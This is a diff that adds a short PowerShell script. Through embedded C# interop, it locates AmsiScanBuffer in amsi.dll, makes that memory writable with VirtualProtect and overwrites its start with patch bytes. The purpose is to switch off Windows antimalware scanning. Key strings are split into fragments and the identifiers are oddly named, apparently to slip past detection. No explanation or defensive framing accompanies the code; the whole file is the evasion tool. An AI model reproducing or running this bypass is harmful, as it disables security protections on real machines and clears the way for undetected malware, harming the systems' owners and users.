@@ -1,0 +1,27 @@
+$FoxHound = @"
+using System;
+using System.Runtime.InteropServices;
+
+public class BigHound {
+    const string fox = "k"+"e"+"rne"+"l3"+"2";
+        [DllImport(fox)]
+        public static extern IntPtr LoadLibrary(string name);
+
+        [DllImport(fox)]
+        public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
+
+        [DllImport(fox)]
+        public static extern bool VirtualProtect(IntPtr diresion, UIntPtr dwSize, uint flNewProtect, out int lpflOldProtect);
+
+}
+"@
+Add-Type $FoxHound
+$manol = "a"+"m"+"s"+"i.dl"+"l"
+$pa = [BigHound]::LoadLibrary($manol)
+$kei = [BigHound]::GetProcAddress($pa, "A"+"ms"+"iSc"+"a"+"n"+"B"+"u"+"ff"+"er")
+$ret = [Byte[]] ( 0xc3, 0x80, 0x07, 0x00,0x57, 0xb8 )
+$out = 0
+
+[BigHound]::VirtualProtect($kei, [uint32]$ret.Length, 0x40, [ref] $out)
+[System.Runtime.InteropServices.Marshal]::Copy($ret, 0, $kei, $ret.Length)
+[BigHound]::VirtualProtect($kei, [uint32]$ret.Length, $out, [ref] $null)
